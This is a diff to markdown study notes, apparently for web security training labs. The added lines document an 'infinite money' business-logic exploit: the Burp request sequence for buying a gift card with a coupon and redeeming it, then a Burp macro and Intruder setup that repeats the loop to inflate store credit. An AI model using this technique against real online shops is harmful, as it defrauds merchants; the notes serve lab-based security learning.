@@ -560,7 +560,34 @@
     - browse to admin page, now defaulted as administrator
 - Flawed enforcement of business rules
   - alternate 2 different coupon codes and reuse it multiple times (NEWCUST5, SIGNUP30)   
-- Infinite money logic flaw   
+- Infinite money logic flaw
+  > [!Burp traffic]   
+  > **add gift card** to cart   
+    POST /cart   
+    productId=2&redir=PRODUCT&quantity=1   
+  > **add coupon**   
+    POST /cart/coupon   
+    csrf=2kU4B4BzdMI3zVhywivxPAa31kEkNm00&coupon=SIGNUP30   
+    GET /cart/order-confirmation?order-confirmed=true   
+    Gift card code = lHdlmj91Nu   
+  > **place order**   
+    POST /cart/checkout   
+    csrf=2kU4B4BzdMI3zVhywivxPAa31kEkNm00   
+  > **redeem gift card**   
+    POST /gift-card   
+    csrf=2kU4B4BzdMI3zVhywivxPAa31kEkNm00&gift-card=lHdlmj91Nu   
+    GET /my-account   
+  - Settings > Project > Session > **Session handling rules panel, click "add"** > session handling rule editor appear
+  - Scope tab > select '**include all URLs**'
+  - Details tab > click "add" **run a micro** > click "add"
+    - POST /cart
+    - POST /cart/coupon
+    - POST /cart/checkout
+    - GET /cart/order-confirmation?order-confirmed=true > click configure item > **add a custom parameter** > name 'gift-card' > **highlight the gift card code** at the bottom of the response > Ok to go back Macro Editor
+    - POST /gift-card > click configure item > under **gift-card parameter handling** > select dropdown list **'derive from prior response**' > Ok to go back Macro Editor
+  - **Test Macro** > Ok to go back Burp
+  - Burp Intruder > **GET /my-account** > Sniper > **null payloads > generate 412 payloads **> max 1 concurrent request
+  - Store credit++ (Refresh the page)
 - Authentication bypass via encryption oracle   
 
 ## Command Injection
